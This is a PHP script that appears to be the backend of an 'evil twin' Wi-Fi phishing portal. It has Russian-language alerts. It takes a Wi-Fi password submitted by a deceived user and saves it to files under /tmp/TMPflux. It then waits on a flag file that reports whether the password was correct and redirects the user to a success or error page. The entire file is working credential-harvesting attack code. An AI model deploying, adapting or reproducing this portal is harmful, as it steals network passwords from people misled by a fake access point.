<?php
error_reporting(0);

$count_my_page = ("/tmp/TMPflux/hit.txt");
$hits = file($count_my_page);
$hits[0] ++;
$fp = fopen($count_my_page , "w");
fputs($fp , "$hits[0]");
fclose($fp);

// Receive form Post data and Saving it in variables

$key1 = @$_POST['key1'];

// Write the name of text file where data will be store
$filename = "/tmp/TMPflux/data.txt";
$filename2 = "/tmp/TMPflux/status.txt";
$intento = "/tmp/TMPflux/intento";
$attemptlog = "/tmp/TMPflux/pwattempt.txt";


// Marge all the variables with text in a single variable.
$f_data= ''.$key1.'';

$pwlog = fopen($attemptlog, "w");
fwrite($pwlog,"$f_data");
fwrite($pwlog,"\n");
fclose($pwlog);


if ( (strlen($key1) < 8) ) {
echo "<script type=\"text/javascript\">alert(\"Пароль должен быть не менее 7 символов!\");window.history.back()</script>";
return;
}

if ( (strlen($key1) > 63) ) {
echo "<script type=\"text/javascript\">alert(\"Пароль должен быть не более 64 символов!\");window.history.back()</script>";
return;
}


$file = fopen($filename, "w");
fwrite($file,"$f_data");
fwrite($file,"\n");
fclose($file);


$archivo = fopen($intento, "w");
fwrite($archivo,"\n");
fclose($archivo);

while(1)
{

if (file_get_contents("$intento") == 2) {
	    header("Location:final.html");
	    break;
	}
if (file_get_contents("$intento") == 1) {
	    header("Location:error.html");
	    unlink($intento);
	    break;
	}

sleep(1);
}

?>
